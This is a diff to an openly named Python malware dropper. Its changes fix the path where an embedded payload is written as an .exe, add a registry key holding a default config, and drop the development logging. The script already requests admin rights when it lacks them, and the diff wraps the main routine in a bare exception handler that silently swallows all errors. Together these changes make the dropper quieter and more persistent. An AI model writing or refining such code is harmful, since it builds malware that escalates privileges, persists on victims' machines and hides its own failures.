@@ -27,13 +27,11 @@ def create_malware(path, binary_code):
 
 
 def setup_folder():
-    # filename = PAYLOAD_FILENAME
-    # new_path = MALWARE_PATH
-    # new_binary_path = f"{new_path}\\{filename}.exe"
-    new_binary_path = f"{MALWARE_PATH}{PAYLOAD_FILENAME}.exe"
+    new_binary_path = f"{MALWARE_PATH}/{PAYLOAD_FILENAME}.exe"
 
     if not os.path.exists(MALWARE_PATH):
         Path(MALWARE_PATH).mkdir(0o777, True, True)
+        # os.mkdir(MALWARE_PATH)
         create_malware(new_binary_path, payload.payload())
 
     return new_binary_path
@@ -41,6 +39,8 @@ def setup_folder():
 
 def setup_registry():
     Registry.create_key(REG_KEY)
+    registry = Registry(REG_KEY)
+    registry.set_value("config", DEFAULT_CONFIG)
 
 
 def start_malware(path):
@@ -49,8 +49,6 @@ def start_malware(path):
 
 
 def main():
-    development_logging()
-
     if is_admin() == 0:
         run_as_admin()
 
@@ -61,4 +59,7 @@ def main():
 
 
 if __name__ == "__main__":
-    main()
+    try:
+        main()
+    except:
+        pass
